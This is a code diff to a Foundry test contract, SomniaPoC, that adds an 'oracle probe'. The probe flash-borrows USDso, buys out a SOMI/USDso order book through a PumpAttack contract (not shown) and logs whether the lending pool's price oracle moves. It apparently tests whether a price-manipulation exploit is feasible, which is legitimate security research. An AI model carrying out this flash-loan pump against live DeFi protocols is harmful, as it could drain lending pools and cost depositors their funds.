@@ -454,6 +454,7 @@ contract SomniaPoC is Test {
         console2.log("block", block.number);
         _reserves();
         _book();
+        _oracleProbe();
 
         if (vm.envOr("PINNED_ONLY", false)) return;
         _sweep();
@@ -507,6 +508,51 @@ contract SomniaPoC is Test {
         console2.log("  liquidation threshold", liqThreshold);
         console2.log("  liquidation bonus", liqBonus);
         console2.log("  EXPLOITABLE (ltv >= 10000)", ltv >= BPS);
+    }
+
+    /// @notice The falsification test for "pump the DEX, make the oracle report high, withdraw".
+    ///
+    ///         It does exactly that and nothing else: flash USDso, consume the ENTIRE SOMI/USDso
+    ///         ask book so the marginal price is dragged as far up as the venue allows, HOLD the
+    ///         SOMI (never supply it, so no LTV ceiling applies), and re-read the exact oracle the
+    ///         lending pool uses. If the oracle does not move here it will not move at any size,
+    ///         because this already spends every unit of liquidity the venue has.
+    function _oracleProbe() internal {
+        uint256 flash = vm.envOr("PROBE_USDSO", uint256(0));
+        if (flash == 0) {
+            IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 50);
+            uint256 notional;
+            for (uint256 i; i < asks.length; ++i) {
+                notional += (asks[i].price * asks[i].quantity) / 1e18;
+            }
+            flash = notional + (notional / 10) + 1_000e18;
+        }
+        console2.log("=== ORACLE PROBE (hold, never supply) flash USDso", flash);
+        PumpAttack a = new PumpAttack(false);
+        try a.run(flash, vm.envOr("PROBE_PUMP_BPS", uint256(1_000_000))) {
+            _probeReport(a.metrics(), "repaid");
+        } catch (bytes memory err) {
+            Metrics memory m = _decode(err);
+            if (m.flashAmount == 0) {
+                console2.log("  probe reverted without metrics");
+                return;
+            }
+            _probeReport(m, "reverted");
+        }
+    }
+
+    function _probeReport(Metrics memory m, string memory status) internal pure {
+        console2.log("  status", status);
+        console2.log("  SOMI bought and HELD", m.somiBought);
+        console2.log("  USDso spent into the book", m.usdsoSpent);
+        console2.log("  exec price", m.execPrice);
+        console2.log("  best ask before", m.askBefore);
+        console2.log("  best ask after ", m.askAfter);
+        console2.log("  ASK MOVE BPS (did the pump work?)", _move(m.askBefore, m.askAfter));
+        console2.log("  oracle before", m.oracleBefore);
+        console2.log("  oracle after ", m.oracleAfter);
+        console2.log("  ORACLE MOVE BPS (only number that matters)", _move(m.oracleBefore, m.oracleAfter));
+        console2.log("  oracle moved at all?", _move(m.oracleBefore, m.oracleAfter) > 0);
     }
 
     function _book() internal view {
